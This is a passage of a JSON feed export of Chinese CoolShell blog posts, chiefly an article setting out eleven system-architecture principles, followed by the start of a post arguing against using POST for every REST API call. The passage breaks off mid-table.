语法\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/8460.html\">Go 语言简介（上）— 语法</a></li></ul></div></div>The post <a href=\"https://coolshell.cn/articles/21649.html\">源代码特洛伊木马攻击</a> first appeared on <a href=\"https://coolshell.cn/\">酷 壳 - CoolShell</a>."
    },
    "origin": {
        "streamId": 10,
        "title": "酷壳",
        "htmlUrl": "https://coolshell.cn/",
        "feedUrl": "https://coolshell.cn/feed"
    }
},
{
    "id": "https://coolshell.cn/?p=21672",
    "timestampUsec": "1657644531898533",
    "categories": [
        "程序设计",
        "系统架构",
        "Architecture",
        "Design",
        "程序员",
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "我做系统架构的一些原则",
    "author": ";陈皓",
    "published": 1640072760,
    "updated": 1640072760,
    "alternate": [
        {
            "href": "https://coolshell.cn/articles/21672.html",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<p><img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2021/12/bachelor-mechanical-eng-icon@72x.png\" alt=\"\" width=\"250\" height=\"250\">工作 20 多年了，这 20 来年看到了很多公司系统架构，也看到了很多问题，在跟这些公司进行交流和讨论的时候，包括进行实施和方案比较的时候，都有很多各种方案的比较和妥协，因为相关的经历越来越多，所以，逐渐形成了自己的逻辑和方法论。今天，想写下这篇文章，把我的这些个人的经验和想法总结下来，希望能够让更多的人可以参考和借鉴，并能够做出更好的架构来。另外，我的这些思维方式和原则都针对于现有市面上众多不合理的架构和方案，所以，也算是一种“纠正”……（注意，这篇文章所说的这些架构上的原则，一般适用于相对比较复杂的业务，如果只是一些简单和访问量不大的应用，那么你可能会得出相反的结论）</p>\n<h4>原则一：关注于真正的收益而不是技术本身</h4>\n<p>对于软件架构来说，我觉得第一重要的是架构的收益，如果不说收益，只是为了技术而技术，而没有任何意义。对于技术收益来说，我觉得下面这几个收益是非常重要的：</p>\n<ul>\n<li><strong>是否可以降低技术门槛加快整个团队的开发流程</strong>。能够加快整个团队的工程流程，快速发布，是软件工程一直在解决的问题，所以，系统架构需要能够进行并行开发，并行上线和并行运维，而不会让某个团队成为瓶颈点。（注：就算拖累团队的原因是组织构架，也不妨碍我们做出并行的系统架构设计）</li>\n<li><strong>是否可以让整个系统可以运行的更稳定</strong>。要让整个系统可以运行的更为的稳定，提升整个系统的 SLA，就需要对有计划和无计划的停机做相应的解决方案（参看《<a title=\"关于高可用的系统\" href=\"https://coolshell.cn/articles/17459.html\" target=\"_blank\" rel=\"noopener\">关于高可用的架构</a>》）</li>\n<li><strong>是否可以通过简化和自动化降低成本</strong>。最高优化的成本是人力成本，人的成本除了慢和贵，还有经常不断的 human error。如果不能降低人力成本，反而需要更多的人，那么这个架构设计一定是失败的。除此之外，是时间成本，资金成本。</li>\n</ul>\n<p>如果一个系统架构不能在上面三个事上起到作用，那就没有意义了。</p>\n<p><span></span></p>\n<h4>原则二：以应用服务和 API 为视角，而不是以资源和技术为视角</h4>\n<p>国内很多公司都会有很多分工，基本上都会分成运维和开发，运维又会分成基础运维和应用运维，开发则会分成基础核心开发和业务开发。不同的分工会导致完全不同的视角和出发点。比如，基础运维和开发的同学更多的只是关注资源的利用率和性能，而应用运维和业务开发则更多关注的是应用和服务上的东西。这两者本来相关无事，但是因为分布式架构的演进，导致有一些系统已经说不清楚是基础层的还是应用层的了，比如像服务治理上的东西，里面即有底层基础技术，也需要业务的同学来配合，包括 k8s 也样，里面即有底层的如网络这样的技术，也有需要业务配合的 readniess和 liveness 这样的健康检查，以及业务应用需要 configMap 等等 ……</p>\n<p><strong>这些东西都让我感觉到所谓 DevOps，其实就是因为很多技术和组件已经分不清是 Dev 还是 Ops 的了，所以，需要合并 Dev和 Ops</strong>。而且，整个组织和架构的优化，已经不能通过调优单一分工或是单一组件能够有很大提升的了。其需要有一种自顶向下的，整体规划，统一设计的方式，才能做到整体的提升（可以试想一下城市交通的优化，当城市规模到一定程度的时候，整体的性能你是无法通过优化几条路或是几条街区来完成的，你需要对整个城市做整体的功能体的规划才可能达到整体效率的提升）。而为了做到整体的提升，需要所有的人都要有一个统一的视角和目标，这几年来，我觉得这个目标就是——<strong>要站在服务和 对外API的视角来看问题，而不是技术和底层的角度。</strong></p>\n<h4>原则三：选择最主流和成熟的技术</h4>\n<p>技术选型是一件很重要的事，技术一旦选错，那会导致整个架构需要做调整，而对架构的调整重来都不是一件简单的事，我在过去几年内，当系统越来越复杂的时候，用户把他们的  PHP，Python, .NET，或 Node.js 的架构完全都迁移到 Java + Go 的架构上来的案例不断的发生。这个过程还是非常痛苦的，但是你没有办法，当你的系统越来越复杂，越来越大时，你就再也不能在一些玩具技术上玩了，你需要的更为工业化的技术。</p>\n<ul>\n<li><strong>尽可能的使用更为成熟更为工业化的技术栈，而不是自己熟悉的技术栈</strong>。 所谓工业化的技术栈，你可以看看大多数公司使用的技术栈，比如：互联网，金融，电信……等等 ，大公司会有更多的技术投入，也需要更大规模的生产，所以，他们使用的技术通常来说都是比较工业化的。在技术选型上，千万不要被——“你看某个视频公司也在用这个技术”，或是一些在论坛上看到的一些程序员吐槽技术的观点（没有任何的数据，只有自己的喜好）来决定自己的技术，还是看看主流大多数公司实际在用的技术栈，会更靠谱一些。</li>\n<li><strong>选择全球流行的技术，而不是中国流行的技术</strong>。技术这个东西一定是一个全球化的东西，不是一个局域化的事。所以，一定要选国际化的会更好。另外，千万不要被某些公司的“特别案例”骗过去了，那怕这个案例很性感，关键还是要看解决问题的思路和采用的技术是否具有普世性。只有普世性的技术有更强的生命力。</li>\n<li><strong>尽可能的使用红利大的主流技术，而不要自己发明轮子，更不要魔改</strong>。我见过好些个公司魔改开源软件，比如有个公司同魔改mesos，最后改着改着发现自己发明另一个 kubernetes。我还见过很多公司或技术团队喜欢自己发明自己的专用轮子，最后都会被主流开源软件所取代。完全没有必要。不重新发明轮子，不魔改，不是因为自己技术不能，而是因为，这个世界早已不是自己干所有事的年代了，这个时代是要想尽方法跟整个产业，整个技术社区融合和合作，这样才会有最大的收益。那些试图因为某个特例需要自成一套的玩法，短期没问题，但长期来说，我都不看好。</li>\n<li><strong>绝大多数情况下，如无非常特殊要求，选 Java基本是不会错的</strong>。一方面，这是因为 Java 的业务开发的生产力是非常好的，而且有 Spring 框架保障，代码很难写烂，另外，Java 的社区太成熟了，你需要的各种架构和技术都可以很容易获得，技术红利实在是太大。这种运行在JVM上的语言有太多太多的好处了。在 Java 的技术栈上，你的架构风险和架构的成本（无论是人力成本，时间成本和资金成本）从长期来说都是最优的</li>\n</ul>\n<p>在我见过的公司中，好些公司的架构都被技术负责人个人的喜好、擅长和个人经验给绑架了，完全不是从一个客观的角度来进行技术选型。其实，从 0 到 1 的阶段，你用什么样的技术都行，如果你做一个简单的应用，没有事务处理没有复杂的交易流程，比如一些论坛、社交之类的应用，你用任何语言都行。但是如果有一天你的系统变复杂了，需要处理交易了，量也上来了，从 1 到 10，甚至从 10 到 100，你的开发团队也变大了，需要构建的系统越来越大，你可能会发现你只有一个选择，就是 Java。想想京东从.NET 到 Java，淘宝从 PHP 到 Java……</p>\n<p>注，一些有主观喜好的人一定会对我上述对 Java 的描述感到不适，我还用一些证据说明一下——全中国所有的电商平台，几百家银行，三大电信运营商，所有的保险公司，劵商的系统，医院里的系统，电子政府系统，等等，基本都是用 Java 开发的，包括 AWS 的主流语言也是 Java，阿里云一开始用 C++/Python 写控制系统，后面也开始用 Java ……你可能会说 B站是用 go语言，但是你可能不知道 B 站的电商和大数据是用 Java……懂着数据分析的同学，建议上各大招聘网站上搜一下 Java 的职位数量，你就知道某个技术是否主流和热门……</p>\n<h4>原则四：完备性会比性能更重要</h4>\n<p>我发现好些公司的架构师做架构的时候，首要考虑的是架构的性能是否能够撑得住多大多大的流量，而不是考虑系统的完备性和扩展性。所以，我已经多次见过这样的案例了，一开始直接使用 MongoDB 这样的非关系型数据库，或是把数据直接放在 Redis 里，而直接放弃关系型数据库的数据完备性的模型，而在后来需要在数据上进行关系查询的时候，发现 NoSQL 的数据库在 Join 上都表现的太差，然后就开始各种飞线，为了不做 Join 就开始冗余数据，然而自己又维护不好冗余数据后带来的数据一致性的问题，导致数据上的各种错乱丢失。</p>\n<p>所以，我给如下的一些如下的架构原则：</p>\n<ul>\n<li><strong>使用最科学严谨的技术模型为主，并以不严谨的模型作为补充</strong>。对于上面那个案例来说，就是——永远使用完备支持 ACID 的关系型数据库，然后用 NoSQL 作补充，而不是完全放弃关系型数据库。这里的原则就是所谓的“先紧后松”，一开始紧了，你可以慢慢松，但是开始松了，以后你想紧再也紧不过来了。</li>\n<li><strong>性能上的东西，总是有很多解的</strong>。我这么多年的经历告诉我，性能上的事，总是有解的，手段也是最多的，这个比起架构的完备性和扩展性来说真的不必太过担心。</li>\n</ul>\n<p>为了追求所谓的性能，把整个系统的完备性丢失掉，相当地得不偿失。</p>\n<h4>原则五：制定并遵循服从标准、规范和最佳实践</h4>\n<p>这个原则是非常重要的，因为只有服从了标准，你的架构才能够有更好的扩展性。比如：我经常性的见到很多公司的系统既没有服从业界标准，也没有形成自己公司的标准，感觉就像一群乌合之众一样。最典型的例子就是 HTTP 调用的状态返回码。业内给你的标准是 200表示成功，3xx 跳转，4xx 表示调用端出错，5xx 表示服务端出错，我实在是不明白为什么无论成功和失败大家都喜欢返回 200，然后在 body 里指出是否error（前两年我在微信公众号里看到一个有一定名气的互联网老兵推荐使用无论正确还是出错都返回 200 的做法，我在后台再三确认后，我发现这样的架构师真是害人不浅）。这样做最大的问题是——监控系统将在一种低效的状态下工作。监控系统需要把所有的网络请求包打开后才知道是否是错误，而且完全不知道是调用端出错还是服务端出错，于是一些像重试或熔断这样的控制系统完全不知道怎么搞（如果是 4xx错，那么重试或熔断是没有意义的，只有 5xx 才有意义）。<strong>有时候，我会有种越活越退步的感觉，错误码设计这种最基本最基础的东西为什么会没有？并且一个公司会任由着大家乱来？这些基础技能怎么就这样丢掉了？</strong></p>\n<p>还有，我还见过一些公司，他们整个组织没有一个统一的用户 ID 的设计，各个系统之间同步用户的数据是通过用户的身份证 ID，是的，就是现实世界的身份证 ID，包括在网关上设置的用户白名单居然也是用身份证 ID。我对这个公司的内的用户隐私管理有很大的担忧。一个企业，一个组织，如果没有标准和规范，也就会有抽象，这一定是要出各种乱子的。</p>\n<p>下面，我罗列一些你需要注意的标准和规范（包括但不限于）：</p>\n<ul>\n<li><strong>服务间调用的协议标准和规范</strong>。这其中包括 Restful API路径, HTTP 方法、状态码、标准头、自定义头等，返回数据 JSon Scheme……等。</li>\n<li><strong>一些命名的标准和规范</strong>。这其中包括如：用户 ID，服务名、标签名、状态名、错误码、消息、数据库……等等</li>\n<li><strong>日志和监控的规范</strong>。这其中包括：日志格式，监控数据，采样要求，报警……等等</li>\n<li><strong>配置上的规范</strong>。这其中包括：操作系统配置、中间件配置，软件包……等等</li>\n<li><strong>中间件使用的规范</strong>。数据库，缓存、消息队列……等等</li>\n<li><strong>软件和开发库版本统一</strong>。整个组织架构内，软件或开发库的版本最好每年都升一次级，然后在各团队内统一。</li>\n</ul>\n<p>这里重要说一下两个事：</p>\n<ul>\n<li><strong>Restful API 的规范</strong>。我觉得是非常重要的，这里给两个我觉得写得最好的参考：<a href=\"https://github.com/paypal/api-standards/blob/master/api-style-guide.md\" target=\"_blank\" rel=\"noopener\">Paypal</a> 和 <a href=\"https://github.com/microsoft/api-guidelines\" target=\"_blank\" rel=\"noopener\">Microsoft</a> 。Restful API 有一个标准和规范最大的好处就是监视可以很容易地做各种统计分析，控制系统可以很容易的做流量编排和调度。</li>\n<li><strong>另一个是服务调用链追踪</strong>。对于服务调用链追踪来说，基本上都是参考于 <a href=\"https://research.google/pubs/pub36356/\" target=\"_blank\" rel=\"noopener\">Google Dapper</a> 这篇论文，目前有很多的实现，最严格的实现是 <a href=\"https://zipkin.io/\" target=\"_blank\" rel=\"noopener\">Zipkin</a>，这也是 Spring Cloud Sleuth 的底层实现。Zipkin 贴近 Google Dapper 论文的好处在于——无状态，快速地把 Span 发出来，不消耗服务应用侧的内存和 CPU。这意味着，监控系统宁可自己死了也不能干扰实际应用。</li>\n<li><strong>软件升级</strong>。我发现很多公司包括 BAT，他们完全没有软件升级的活动，全靠开发人员自发。然而，这种成体系的活动，是永远不可能靠大众的自发形成的。一个公司至少一年要有一次软件版本升级的review，然后形成软件版本的统一和一致，这样会极太简化系统架构的复杂度。</li>\n</ul>\n<h4>原则六：重视架构扩展性和可运维性</h4>\n<p>在我见过很多架构里，技术人员只考虑当下，但从来不考虑系统的未来扩展性和可运维性。所谓的管生不管养。如果你生下来的孩子胳膊少腿，严重畸形，那么未来是很难玩的。因为架构和软件不是写好就完的，是需要不断修改不断维护的，80%的软件成本都是在维护上。所以，如何让你的架构有更好的扩展性，可以更容易地运维，这个是比较重要的。所谓的扩展性，意味着，我可以很容易地加更多的功能，或是加入更多的系统，而所谓可运维，就是说我可以对线上的系统做任意的变更。扩展性要求的是有标准规范且不耦合的业务架构，可运维性要求的则是可控的能力，也就是一组各式各样的控制系统。</p>\n<ul>\n<li><strong>通过服务编排架构来降低服务间的耦合</strong>。比如：通过一个业务流程的专用服务，或是像 Workflow，Event Driven Architecture ， Broker，Gateway，Service Discovery 等这类的的中间件来降低服务间的依赖关系。</li>\n<li><strong>通过服务发现或服务网关来降低服务依赖所带来的运维复杂度</strong>。服务发现可以很好的降低相关依赖服务的运维复杂度，让你可以很轻松的上线或下线服务，或是进行服务伸缩。</li>\n<li><strong>一定要使用各种软件设计的原则</strong>。比如：像SOLID这样的原则（参看《<a title=\"一些软件设计的原则\" href=\"https://coolshell.cn/articles/4535.html\">一些软件设计的原则</a>》），IoC/DIP，SOA 或 Spring Cloud 等 架构的最佳实践（参看《<a title=\"SteveY对Amazon和Google平台的吐槽 - 67,710 人阅读\" href=\"https://coolshell.cn/articles/5701.html\" target=\"_blank\" rel=\"noopener\">SteveY对Amazon和Google平台的吐槽</a>》中的 Service Interface 的那几条军规），分布式系统架构的相关实践（参看：《<a title=\"分布式系统的事务处理\" href=\"https://coolshell.cn/articles/10910.html\" target=\"_blank\" rel=\"noopener\">分布式系统的事务处理</a>》，或微软件的 《<a href=\"https://docs.microsoft.com/en-us/azure/architecture/patterns/\" target=\"_blank\" rel=\"noopener\">Cloud Design Patterns</a>》）……等等</li>\n</ul>\n<h4>原则七：对控制逻辑进行全面收口</h4>\n<p>所有的程序都会有两种逻辑，一种是业务逻辑，一种是控制逻辑，业务逻辑就是完成业务的逻辑，控制逻辑是辅助，比如你用多线程，还是用分布式，是用数据库还是用文件，如何配置、部署，运维、监控，事务控制，服务发现，弹性伸缩，灰度发布，高并发，等等，等等 ……这些都是控制逻辑，跟业务逻辑没有一毛钱关系。控制逻辑的技术深度会通常会比业务逻辑要深一些，门槛也会要高一些，所以，最好要专业的程序员来负责控制逻辑的开发，统一规划统一管理，进行收口。这其中包括：</p>\n<ul>\n<li><strong>流量收口</strong>。包括南北向和东西向的流量的调度，主要通过流量网关，开发框架 SDK或 Service Mesh 这样的技术。</li>\n<li><strong>服务治理收口</strong>。包括：服务发现、健康检查，配置管理、事务、事件、重试、熔断、限流……主要通过开发框架 SDK – 如：Spring Cloud，或服务网格Service Mesh等技术。</li>\n<li><strong>监控数据收口</strong>。包括：日志、指标、调用链……主要通过一些标准主流的探针，再加上后台的数据清洗和数据存储来完成，最好是使用无侵入式的技术。监控的数据必须统一在一个地方进行关联，这样才会产生信息。</li>\n<li><strong>资源调度有应用部署的收口</strong>。包括：计算、网络和存储的收口，主要是通过容器化的方案，如k8s来完成。</li>\n<li><strong>中间件的收口</strong>。包括：数据库，消息，缓存，服务发现，网关……等等。这类的收口方式一般要在企业内部统一建立一个共享的云化的中间件资源池。</li>\n</ul>\n<p>对此，这里的原则是：</p>\n<ul>\n<li><strong>你要选择容易进行业务逻辑和控制逻辑分离的技术</strong>。这里，Java 的 JVM+字节码注入+AOP 式的Spring 开发框架，会带给你太多的优势。</li>\n<li><strong>你要选择可以享受“前人种树，后人乘凉”的有技术红利的技术</strong>。如：有庞大社区而且相互兼容的技术，如：Java, Docker,  Ansible，HTTP，Telegraf/Collectd……</li>\n<li><strong>中间件你要使用可以 支持HA集群和多租户的技术</strong>。这里基本上所有的主流中间件都会支持 HA 集群方式的。</li>\n</ul>\n<h4>原则八：不要迁就老旧系统的技术债务</h4>\n<p>我发现很多公司都很非常大的技术债务，这些债务具体表现如下：</p>\n<ul>\n<li><strong>使用老旧的技术</strong>。比如，使用HTTP1.0， Java 1.6，Websphere，ESB，基于 socket的通讯协议，过时的模型……等等</li>\n<li><strong>不合理的设计</strong>。比如，在 gateway 中写大量的业务逻辑，单体架构，数据和业务逻辑深度耦合，错误的系统架构（把缓存当数据库，用消息队列同步数据）……等等</li>\n<li> <strong>缺少配套设施</strong>。比如，没有自动化测试，没有好的软件文档，没有质量好的代码，没有标准和规范……等等</li>\n</ul>\n<p>来找我寻求技术帮助的人都有各种各样的问题。我都会对他们苦口婆心地说同样的一句话——“<strong>如果你是来找我 case-by-case 解决问题，我兴趣不大，因为，你们千万不要寄希望能够很简单的把一辆夏利车改成一辆法拉利跑车，或是把一栋地基没打好的歪楼搞正。以前欠下的技术债，都得要还，没打好的地基要重新打，没建配套设施都要建。这些基础设施如果不按照正确科学的方式建立的话，你是不可能有一个好的的系统，我也没办法帮你 case-by-case 的解决问题……</strong>”，一开始，他们都会对我说，没问题，我们就是要还债，但是，最后发现要还的债真多，有点承受不了，就开始现原形了。</p>\n<p>他们开始为自己的“欠的技术债”找各种合理化的理由——给你解释各种各样的历史原因和不得以而为之的理由。谈着谈着，让我有一种感觉——他们希望得到一种什么都不改什么都不付出的方式就可以进步的心态，他们宁可让新的技术 low 下来迁就于这些技术债，把新的技术滥用地乱七八糟的。有一个公司，他们的系统架构和技术选型基本都搞错了，使用错误的模型构建系统，导致整个系统的性能非常之差，也才几千万条数据，但他们想的不是还债，不是把地基和配套设施建好，而且要把楼修的更高，上更多的系统——他们觉得现有的系统挺好，性能问题的原因是他们没一个大数据平台，所以要建大数据平台……</p>\n<p>我见过很多很多公司，包括大如 BAT 这样的公司，都会在原来的技术债上进行更多的建设，然后，技术债越来越大，利息越来越大，最终成为一个高利贷，再也还不了（我在《<a href=\"https://coolshell.cn/articles/11656.html\" target=\"_blank\" rel=\"noopener\">开发团队的效率</a>》一文中讲过一个 WatchDog 的架构模式，一个系统烂了，不是去改这个系统，而是在旁边建一个系统来看着它，我很难理解为什么会有这样的逻辑，也许是为了要解决更多的就业……）</p>\n<p>这里有几个原则和方法我是非常坚持的，分享给大家：</p>\n<ul>\n<li><strong>与其花大力气迁就技术债务，不如直接还技术债。是所谓的长痛不如短痛。</strong></li>\n<li><strong>建设没有技术债的“新城区”，并通过“<a href=\"https://docs.microsoft.com/en-us/azure/architecture/patterns/anti-corruption-layer\" target=\"_blank\" rel=\"noopener\">防腐层</a> ”的架构模型，不要让技术债侵入“新城区”</strong>。</li>\n</ul>\n<h4>原则九：不要依赖自己的经验，要依赖于数据和学习</h4>\n<p>有好些人来找我跟我说他们的技术问题，然后希望我能够给他们一个答案。我说，我需要了解一下你现有系统的情况，也就是需要先做个诊断，我只有得到这些数据后，我才可能明白真正的原因是什么 ，我才可能给你做出一个比较好的技术方案。我个人觉得这是一种对对方负责的方法，因为技术手段太多了，所有的技术手段都有适应的场景，并且有各种 trade-off，所以，只有调研完后才能做出决定。这跟医生看病是一样的，确诊病因不能靠经验，还是要靠诊断数据。在科学面前，所有的经验都是靠不住的……</p>\n<p>另外，如果有一天你在做技术决定的时候，开始凭自己以往的经验，那么你就已经不可能再成长了。人都是不可能通过不断重复过去而进步的，人的进步从来都是通过学习自己不知道的东西。所以，千万不要依赖于自己的经验做决定。做任何决定之前，最好花上一点时间，上网查一下相关的资料，技术博客，文章，论文等 ，同时，也看看各个公司，或是各个开源软件他们是怎么做的？然后，比较多种方案的 Pros/Cons，最终形成自己的决定，这样，才可能做出一个更好的决定。</p>\n<h4>原则十：千万要小心 X – Y 问题，要追问原始需求</h4>\n<p>对于 <a title=\"X-Y Problem\" href=\"https://coolshell.cn/articles/10804.html\">X-Y 问题</a>，也就是说，用户为了解决 X问题，他觉得用 Y 可以解，于是问我 Y 怎么搞，结果搞到最后，发现原来要解决的 X 问题，这个时候最好的解决方案不是 Y，而是 Z。 这种 X-Y 问题真是相当之多，见的太多太多了。所以，每次用户来找我的时候，我都要不断地追问什么是 X 问题。</p>\n<p>比如，好些用户都会来问我他们要一个大数据流式处理，结果追问具体要解决什么样的问题时，才发现他们的问题是因为服务中有大量的状态，需要把相同用户的数据请求放在同一个服务上处理，而且设计上导致一个慢函数拖慢整个应用服务。最终就是做一下性能调优就好了，根本没有必要上什么大数据的流式处理。</p>\n<p>我很喜欢追问为什么 ，这种追问，会让客户也跟着来一起重新思考。比如，有个客户来找我评估的一个技术架构的决定，从理论上来说，好像这个架构在用户的这个场景下非常不错。但是，这个场景和这个架构是我职业生涯从来没有见过的。于是，我开始追问这个为什么会是这么一个场景？当我追问的时候，我发现用户都感到这个场景的各种不合理。最后引起了大家非常深刻的研讨，最终用户把那个场景修正后，而架构就突然就变成了一个常见且成熟的的模型……</p>\n<h4>原则十一：激进胜于保守，创新与实用并不冲突</h4>\n<p>我对技术的态度是比较激进的，但是，所谓的激进并不是瞎搞，也不是见新技术就上，而是积极拥抱会改变未来的新技术，如：Docker/Go，我就非常快地跟进，但是像区块链或是 Rust 这样的，我就不是很积极。因为，其并没有命中我认为的技术趋势的几个特征（参看《<a title=\"Go语言、Docker 和新技术\" href=\"https://coolshell.cn/articles/18190.html\" target=\"_blank\" rel=\"noopener\">Go,Docker 和新技术</a> 》）。当然，我也不是不喜欢的就不学了，我对区块链和 Rust 我一样学习，我也知道这些技术的优势，但我不会大规模使用它们。另外，我也尊重保守的决定，这里面没有对和错。但是，我个人觉得对技术激进的态度比起保守来说有太多的好处了。一方面来说，对于用户来说，很大程度上来说，新技术通常都表面有很好的竞争力，而且我见太多这样成功的公司都在积极拥抱新的技术的，而保守的通常来说都越来越不好。</p>\n<p>有一些人会跟我说，我们是实用主义，我们不需要创新，能解决当下的问题就好，所以，我们不需要新技术，现有的技术用好就行了。这类的公司，他们的技术设计第一天就在负债，虽然可以解决当下问题，但是马上就会出现新的问题，然后他们会疲于解决各种问题。最后呢，最后还是会走到新的技术上。</p>\n<p>这里的逻辑很简单 —— <strong>进步永远来自于探索，探索是要付出代价的，但是收益更大</strong>。对我而言，不敢冒险才是最大的冒险，不敢犯错才是最大的错误，害怕失去会让你失去的更多……</p>\n<p>（全文完）</p>\n<p align=\"center\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg\"> <img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg\" width=\"300\" height=\"300\"> <br>关注CoolShell微信公众账号和微信小程序</p>\n<div>\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"https://coolshell.cn/\">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>\n</div>\n<div>——=== <b>访问 <a href=\"http://coolshell.cn/404/\" target=\"_blank\">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>\n\n<div><div><h3>相关文章</h3><ul><li><a href=\"https://coolshell.cn/articles/18024.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2017/07/api-design-300x278-2-150x150.jpg\" alt=\"API设计原则 – Qt官网的设计实践总结\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/18024.html\">API设计原则 – Qt官网的设计实践总结</a></li><li><a href=\"https://coolshell.cn/articles/17680.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2017/02/gitlab-600-150x150.jpg\" alt=\"从Gitlab误删除数据库想到的\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/17680.html\">从Gitlab误删除数据库想到的</a></li><li><a href=\"https://coolshell.cn/articles/17459.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2016/08/HighAvailability-BK-150x150.png\" alt=\"关于高可用的系统\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/17459.html\">关于高可用的系统</a></li><li><a href=\"https://coolshell.cn/articles/9949.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2013/07/inverted-bookshelf_thumb-150x150.jpg\" alt=\"IoC/DIP其实是一种管理思想\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/9949.html\">IoC/DIP其实是一种管理思想</a></li><li><a href=\"https://coolshell.cn/articles/6775.html\"><img src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/24.jpg\" alt=\"Bret Victor – Inventing on Principle\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/6775.html\">Bret Victor – Inventing on Principle</a></li><li><a href=\"https://coolshell.cn/articles/5686.html\"><img src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/15.jpg\" alt=\"多些时间能少写些代码\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/5686.html\">多些时间能少写些代码</a></li></ul></div></div>The post <a href=\"https://coolshell.cn/articles/21672.html\">我做系统架构的一些原则</a> first appeared on <a href=\"https://coolshell.cn/\">酷 壳 - CoolShell</a>."
    },
    "origin": {
        "streamId": 10,
        "title": "酷壳",
        "htmlUrl": "https://coolshell.cn/",
        "feedUrl": "https://coolshell.cn/feed"
    }
},
{
    "id": "https://coolshell.cn/?p=22173",
    "timestampUsec": "1657644531898536",
    "categories": [
        "技术新闻",
        "程序设计",
        "HTTP",
        "Programmer",
        "Restful",
        "程序员",
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "“一把梭：REST API 全用 POST”",
    "author": ";陈皓",
    "published": 1644726480,
    "updated": 1644726480,
    "alternate": [
        {
            "href": "https://coolshell.cn/articles/22173.html",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<p><img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2022/02/http_method-300x169.png\" alt=\"\" width=\"325\" height=\"183\"></p>\n<p>写这篇文章的原因主要还是因为V2EX上的这个<a href=\"https://www.v2ex.com/t/830030?p=1\" target=\"_blank\" rel=\"noopener\">贴子</a>，这个贴子中说——</p>\n<blockquote><p>“对接同事的接口，他定义的所有接口都是 post 请求，理由是 https 用 post 更安全，之前习惯使用 restful api ，如果说 https 只有 post 请求是安全的话？那为啥还需要 get 、put 、delete ？我该如何反驳他。”</p></blockquote>\n<p>然后该贴中大量的回复大概有这么几种论调，1）POST挺好的，就应该这么干，沟通少，2）一把梭，早点干完早点回家，3）吵赢了又怎么样？工作而已，优雅不能当饭吃。虽然评论没有一边倒，但是也有大量的人支持。然后，我在Twitter上嘲讽了一下，用POST干一切就像看到了来你家装修工人说，“老子干活就是用钉子钉一切，什么螺丝、螺栓、卡扣、插销……通通不用，钉枪一把梭，方便，快捷，安全，干完早回家……不过，还是有一些网友觉得用POST挺好的，而且可以节约时间。所以，正好，我在《<a title=\"我做系统架构的一些原则\" href=\"https://coolshell.cn/articles/21672.html\" target=\"_blank\" rel=\"noopener\">我做系统架构的原则</a>》中的“<a href=\"https://coolshell.cn/articles/21672.html#%E5%8E%9F%E5%88%99%E4%BA%94%EF%BC%9A%E5%88%B6%E5%AE%9A%E5%B9%B6%E9%81%B5%E5%BE%AA%E6%9C%8D%E4%BB%8E%E6%A0%87%E5%87%86%E3%80%81%E8%A7%84%E8%8C%83%E5%92%8C%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5\" target=\"_blank\" rel=\"noopener\">原则五</a>”中反对API返回码无论对错全是200的返回那，我专门写下这一篇文章，以正视听。</p>\n<p>这篇文章主要分成下面这几个部分：</p>\n<ol>\n<li>为什么要用不同的HTTP动词？</li>\n<li>Restful 进行复杂查询</li>\n<li>几个主要问题的回应\n<ul>\n<li>POST 更安全吗？</li>\n<li>全用 POST 可以节省时间沟通少吗？</li>\n<li>早点回家的正确姿势</li>\n<li>工作而已，优雅不能当饭吃</li>\n</ul>\n</li>\n</ol>\n<p><span></span></p>\n<h4>为什么要用不同的HTTP动词</h4>\n<p>编程世界通常来说有两种逻辑：“<strong>业务逻辑</strong>” 和 “<strong>控制逻辑</strong>”。</p>\n<ul>\n<li><strong>业务逻辑</strong>。就是你实现业务需求的功能的代码，就是跟用户需求强相关的代码。比如，把用户提交的数据保存起来，查询用户的数据，完成一个订单交易，为用户退款……等等，这些是业务逻辑</li>\n<li><strong>控制逻辑</strong>。就是我们用于控制程序运行的非功能性的代码。比如，用于控制程序循环的变量和条件，使用多线程或分布式的技术，使用HTTP/TCP协议，使用什么样数据库，什么样的中间件……等等，这些跟用户需求完全没关系的东西。</li>\n</ul>\n<p>网络协议也是一样的，一般来说，<strong>几乎所有的主流网络协议都有两个部分，一个是协议头，一个是协议体。协议头中是协议自己要用的数据，协议体才是用户的数据。所以，协议头主要是用于协议的控制逻辑，而协议体则是业务逻辑。</strong></p>\n<p>HTTP的动词（或是Method）是在协议头中，所以，其主要用于控制逻辑。</p>\n<p dir=\"auto\">下面是HTTP的动词规范，一般来说，REST API 需要开发人员严格遵循下面的标准规范（参看<a href=\"https://www.rfc-editor.org/rfc/rfc7231#section-4.2.2\" target=\"_blank\" rel=\"noopener\">RFC7231 章节4.2.2 – Idempotent Methods</a>）</p>\n<table>\n<thead>\n<tr>\n<th>方法</th>\n<th>描述</th>\n<th>幂等</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>GET</td>\n<td>用于查询操作，对应于数据库的 <code>select</code> 操作</td>\n<td><img src=\"https://s.w.org/images/core/emoji/14.0.0/72x72/2714.png\" 